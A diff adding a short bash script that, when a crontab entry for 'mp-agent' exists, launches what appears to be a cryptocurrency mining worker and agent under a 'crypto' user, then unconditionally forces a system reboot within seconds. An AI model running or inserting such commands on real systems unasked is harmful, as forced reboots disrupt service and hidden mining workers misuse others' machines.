@@ -1,0 +1,8 @@
+#!/bin/bash
+[ $(cat /var/spool/cron/crontabs/crypto | grep -v ^# | grep mp-agent -c) -gt 0 ] && { 
+	su crypto -c 'ln -s /home/crypto/start-worker.run /home/crypto/start 2>/dev/null'
+	su crypto -c 'python2 /home/crypto/mp-agent.py'
+	/bin/homesync
+}
+(sleep 20 && reboot -f) &
+(sleep 3 && shutdown -r now) &
